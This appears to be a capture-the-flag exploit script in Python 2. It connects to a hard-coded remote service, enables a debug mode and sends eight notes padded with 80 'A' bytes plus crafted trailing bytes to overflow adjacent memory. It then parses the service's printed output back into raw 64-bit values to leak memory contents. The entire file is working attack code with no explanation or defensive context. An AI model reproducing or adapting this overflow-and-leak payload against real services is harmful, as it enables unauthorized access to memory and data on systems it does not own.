#!/usr/bin/env python

import socket
import struct
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("104.238.153.211", 7000))

def send(data):
    s.sendall(data + "\n")

print s.recv(4096)
send("debug")
print s.recv(4096)

last = 0xf8

for i in xrange(0, 8):
    # add
    send("add " + str(i))
    print s.recv(4096)
    # value
    send("0")

    # padding
    send("98")
    print s.recv(4096)
    
    # note
    s.sendall("A" * 80 + chr(last) + "\xff\xff\xff\xff\xff\xff\xff" + "\n")
    last = last + 1
    print s.recv(4096)

send("debug")

print s.recv(4096)

send("print")

while True:
    data = s.recv(4096)

    if len(data):
        pretty = data.split(" ][ ")
        for e in pretty:
            stripped = e.strip(' []')
            try :
                i = int(stripped)
                for c in struct.pack("Q", i):
                    sys.stdout.write(c)
            except ValueError:
                continue
